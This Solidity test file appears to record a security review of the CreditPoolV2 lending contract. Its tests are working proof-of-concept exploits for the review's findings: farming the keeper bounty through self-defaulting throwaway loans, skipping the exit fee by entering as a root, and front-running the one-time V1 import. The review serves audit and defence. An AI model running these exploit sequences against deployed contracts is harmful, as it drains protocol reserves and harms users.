// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CreditPool} from "../../src/CreditPool.sol";
import {CreditPoolV2} from "../../src/CreditPoolV2.sol";
import {MockUSDC} from "../../src/mocks/MockUSDC.sol";
import {MockIdentityRegistry} from "../../src/mocks/MockIdentityRegistry.sol";
import {IERC8004Identity} from "../../src/interfaces/IERC8004Identity.sol";
import {CreditPoolV2Base, RecordingHook} from "../CreditPoolV2.t.sol";

/// Independent review of CreditPoolV2 (2026-09-23). Each `test_F*` PASSES by demonstrating the finding;
/// each `test_cov_*` / `test_ruledOut_*` PASSES by demonstrating the property holds.
contract ReviewPoolV2 is CreditPoolV2Base {
    // ------------------------------------------------------------------
    // F-1 (Medium): the keeper bounty is farmable by defaulting your own loans
    // ------------------------------------------------------------------

    /// A root backing its own throwaway agents loses exactly the principal its agents walked off with, so a
    /// self-default nets zero, and `markDefault` then pays the caller `keeperBounty` out of the reserve.
    /// The reserve (15% of every base fee plus TreasurySponsorV4.sweep's reserve share) drains at
    /// `keeperBounty` per manufactured default. Capital is recycled, identities and addresses are free.
    /// Since the 2026-09-24 fee lock each self-default also costs the loan's unpaid fee (1 d of minLoan, ~0.0017
    /// USDG), far below the bounty at the cap: F-1 still stands there; keeperBounty = 0 at launch is the mitigation.
    function test_F1_keeperBountyFarmedBySelfDefault() public {
        usdc.mint(address(this), 100 * USDC);
        usdc.approve(address(pool), 100 * USDC);
        pool.fundReserve(100 * USDC); // protocol money, e.g. a treasury sweep

        CreditPoolV2.Params memory p = pool.getParams();
        p.keeperBounty = pool.MAX_KEEPER_BOUNTY(); // 5 USDG, the constant cap
        vm.prank(owner);
        pool.setParams(p);

        uint256 n = 10;
        address atk = makeAddr("attacker");
        uint256 stake = n * 5 * USDC + 1 * USDC;
        usdc.mint(atk, stake);
        vm.startPrank(atk);
        usdc.approve(address(pool), type(uint256).max);
        uint256 rootId = reg.register("atk-root");
        pool.enrollRoot(rootId, stake);
        vm.stopPrank();

        uint256 priceBefore = _price();
        uint256 reserveBefore = pool.reserve();
        uint256[] memory loans = new uint256[](n);
        for (uint256 i = 0; i < n; i++) {
            uint256 pk = 0x5000 + i;
            address o = vm.addr(pk);
            vm.prank(o);
            uint256 id = reg.register("throwaway");
            (CreditPoolV2.Consent memory c, bytes memory sig) = _consent(id, rootId, pk, 0);
            vm.prank(atk);
            pool.vouchWithConsent(rootId, id, 5 * USDC, 0, c, sig);
            vm.prank(o);
            loans[i] = pool.borrow(id, 5 * USDC, 1 days, atk, type(uint256).max); // minLoan, minTerm
        }
        vm.warp(pool.getLoan(loans[n - 1]).defaultableAt + 1);
        vm.startPrank(atk);
        for (uint256 i = 0; i < n; i++) {
            pool.markDefault(loans[i]);
        }
        pool.unlock(rootId, pool.rootShares(rootId), atk);
        vm.stopPrank();

        uint256 end = usdc.balanceOf(atk);
        // stake - burnt (principal + fee) + borrowed principal + n bounties, less a unit of rounding per default
        uint256 fees = n * pool.getLoan(loans[0]).fee; // n identical loans
        assertGe(end, stake + n * 5 * USDC - fees - n, "attacker nets one bounty, less one fee, per self-default");
        assertGt(end, stake, "still profitable at the bounty cap");
        assertEq(reserveBefore - pool.reserve(), n * 5 * USDC, "reserve drained by n bounties");
        assertGe(_price(), priceBefore, "lenders untouched: the loss is the reserve's");
        emit log_named_uint("attacker profit (USDG units)", end - stake);
    }

    // ------------------------------------------------------------------
    // F-2 (Low): the 0.5% early-exit fee is optional for anyone who enters as a root
    // ------------------------------------------------------------------

    function _loanDueNow() internal returns (uint256 loanId) {
        _sponsor(ROOT, rootOwner, AGENT, AGENT_PK, 90 * USDC);
        loanId = _borrow(agentOwner, AGENT, 90 * USDC, 30 days);
        vm.warp(block.timestamp + 30 days);
    }

    /// Reference: the same just-in-time move as a lender pays the exit fee and loses money.
    function test_F2_reference_lenderJITPaysTheFee() public {
        uint256 loanId = _loanDueNow();
        address jit = makeAddr("jit");
        usdc.mint(jit, 10_000 * USDC);
        vm.startPrank(jit);
        usdc.approve(address(pool), type(uint256).max);
        uint256 sh = pool.deposit(10_000 * USDC, jit, 0);
        vm.stopPrank();
        _repay(agentOwner, loanId);
        vm.prank(jit);
        uint256 out = pool.withdraw(sh, jit);
        assertLt(out, 10_000 * USDC, "lender path: the exit fee eats the JIT gain");
    }

    /// Via a fresh identity enrolled as a root, the same capital enters one block before a repayment and
    /// leaves right after with the lender share of the fee and no exit fee.
    function test_F2_rootJITSkipsTheExitFee() public {
        uint256 loanId = _loanDueNow();
        address jit = makeAddr("jit");
        usdc.mint(jit, 10_000 * USDC);
        vm.startPrank(jit);
        usdc.approve(address(pool), type(uint256).max);
        uint256 jid = reg.register("jit");
        pool.enrollRoot(jid, 10_000 * USDC);
        vm.stopPrank();
        _repay(agentOwner, loanId);
        uint256 all = pool.rootShares(jid);
        vm.prank(jit);
        uint256 out = pool.unlock(jid, all, jit);
        assertGt(out, 10_000 * USDC, "root path: fee captured, no exit fee, same block");
    }

    // ------------------------------------------------------------------
    // F-5 (Info): freezing an empty line ends the sponsorship with no Released event and no onRelease
    // ------------------------------------------------------------------

    function test_F5_freezeOnAnEmptyLineEndsSponsorshipSilently() public {
        RecordingHook h = new RecordingHook();
        h.set(pool);
        vm.prank(rootOwner);
        pool.setHook(ROOT, address(h));
        _sponsor(ROOT, rootOwner, AGENT, AGENT_PK, 0); // a consented sponsorship with a zero line
        assertEq(pool.getAgent(AGENT).sponsor, ROOT);
        vm.prank(rootOwner);
        pool.freeze(AGENT, true);
        assertEq(pool.getAgent(AGENT).sponsor, 0, "sponsorship ended");
        assertEq(h.releases(), 0, "the backer hook never heard about it");
    }

    // ------------------------------------------------------------------
    // v1 known issues: coverage checks
    // ------------------------------------------------------------------

    /// v1 "dead-root stake stranding": after its child defaults, a v2 root can take out every share it has
    /// left and retire. unlock/retireRoot never read `defaulted`.
    function test_cov_rootStakeNotStrandedAfterAChildDefault() public {
        _sponsor(ROOT, rootOwner, AGENT, AGENT_PK, 10 * USDC);
        uint256 l = _borrow(agentOwner, AGENT, 5 * USDC, 1 days);
        _default(l);
        assertEq(pool.getAgent(ROOT).delegatedOut, 0, "residual released once the last loan closed");
        uint256 left = pool.rootShares(ROOT);
        assertGt(left, 0);
        // the slash is principal + unpaid fee (fee lock, 2026-09-24), less the root's own cut of that fee
        uint256 fee = pool.getLoan(l).fee;
        uint256 expected = 95 * USDC - fee + fee * left / pool.totalShares();
        vm.startPrank(rootOwner);
        uint256 got = pool.unlock(ROOT, left, rootOwner);
        pool.retireRoot(ROOT);
        vm.stopPrank();
        assertApproxEqAbs(got, expected, 2, "100 staked - (5 + fee) slashed comes back");
    }

    /// v1 "repay and re-borrow in one transaction keeps the sponsor locked": once frozen, the repayment
    /// releases the line and ends the sponsorship, so the re-borrow in the same transaction fails.
    function test_cov_rollingLoanCannotKeepAFrozenSponsor() public {
        _sponsor(ROOT, rootOwner, AGENT, AGENT_PK, 10 * USDC);
        uint256 l = _borrow(agentOwner, AGENT, 5 * USDC, 7 days);
        vm.prank(rootOwner);
        pool.freeze(AGENT, true);
        vm.warp(block.timestamp + 7 days);
        vm.startPrank(agentOwner);
        pool.repay(l, AGENT, type(uint256).max);
        vm.expectRevert(abi.encodeWithSelector(CreditPoolV2.WrongSponsor.selector, AGENT, 0));
        pool.borrow(AGENT, 5 * USDC, 7 days, agentOwner, type(uint256).max);
        vm.stopPrank();
        assertEq(pool.getAgent(ROOT).delegatedOut, 0, "the sponsor is free");
    }

    /// Ruled out, lender starvation without the queue: liquidity = totalAssets - principalOut and
    /// principalOut <= sum(delegatedOut) <= sum(backing), so lenders' claims always fit in the cash.
    function test_ruledOut_lenderAlwaysExitsInFullAtMaxBorrowing() public {
        _stakeFee(rootOwner, ROOT, AGENT, 100 * USDC, 30 days);
        _stakeFee(root2Owner, ROOT2, AGENT2, 100 * USDC, 30 days);
        _sponsor(ROOT, rootOwner, AGENT, AGENT_PK, 100 * USDC);
        _sponsor(ROOT2, root2Owner, AGENT2, AGENT2_PK, 100 * USDC);
        _borrow(agentOwner, AGENT, 100 * USDC, 30 days);
        _borrow(agent2Owner, AGENT2, 100 * USDC, 30 days);
        vm.warp(block.timestamp + 8 days);
        uint256 sh = pool.shares(lender);
        vm.prank(lender);
        uint256 out = pool.withdraw(sh, lender);
        assertEq(out, 1_000 * USDC, "every lender share comes out while every backed dollar is lent");
    }
}

/// F-6 (Low): importFromV1 is permissionless and once-only, and v1 is still unpaused on chain
/// (`paused()` = false at 2026-09-23). Anyone can import an agent early and freeze its v2 record: later v1
/// repayments can never be carried over.
contract ReviewPoolV2Migration is CreditPoolV2Base {
    CreditPool v1;
    address v1Owner = makeAddr("v1owner");

    function setUp() public override {
        usdc = new MockUSDC();
        reg = new MockIdentityRegistry();
        v1 = new CreditPool(IERC20(address(usdc)), IERC8004Identity(address(reg)), v1Owner);
        _deploy(v1);
        address[4] memory who = [lender, root2Owner, agentOwner, anyone];
        for (uint256 i = 0; i < who.length; i++) {
            usdc.mint(who[i], 100_000 * USDC);
            vm.startPrank(who[i]);
            usdc.approve(address(pool), type(uint256).max);
            usdc.approve(address(v1), type(uint256).max);
            vm.stopPrank();
        }
        vm.prank(lender);
        v1.deposit(1_000 * USDC, lender);
        vm.prank(root2Owner);
        ROOT2 = reg.register("root2");
        vm.prank(agentOwner);
        AGENT = reg.register("agent");
        vm.startPrank(root2Owner);
        v1.enrollRoot(ROOT2, 100 * USDC);
        v1.vouch(ROOT2, AGENT, 10 * USDC);
        vm.stopPrank();
        _v1Cycle();
    }

    function _v1Cycle() internal {
        vm.prank(agentOwner);
        uint256 l = v1.borrow(AGENT, 5 * USDC, 7 days, agentOwner);
        vm.warp(block.timestamp + 7 days);
        vm.prank(agentOwner);
        v1.repay(l);
    }

    function test_F6_earlyImportFreezesTheRecord() public {
        vm.prank(anyone);
        pool.importFromV1(AGENT);
        _v1Cycle(); // v1 is not paused: history keeps growing there
        assertEq(v1.getAgent(AGENT).loansRepaid, 2);
        assertEq(pool.getAgent(AGENT).loansRepaid, 1, "v2 keeps the snapshot a stranger took");
        vm.expectRevert(abi.encodeWithSelector(CreditPoolV2.AlreadyImported.selector, AGENT));
        pool.importFromV1(AGENT);
    }
}

